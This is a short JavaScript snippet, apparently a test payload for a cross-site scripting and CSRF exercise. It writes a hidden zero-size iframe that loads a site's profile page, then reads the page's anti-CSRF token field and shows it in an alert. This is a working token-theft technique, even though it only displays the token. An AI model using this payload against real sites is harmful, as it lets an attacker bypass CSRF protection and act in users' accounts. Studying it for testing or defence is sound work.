alert("test CSRF");
document.writeln('<iframe id="iframe" src="index.php?action=profile" width="0" height="0" onload="read()"></iframe>');
function read()
{
    alert("test iframe");
    alert(document.getElementById("iframe").contentDocument.getElementById("profile").token.value);
}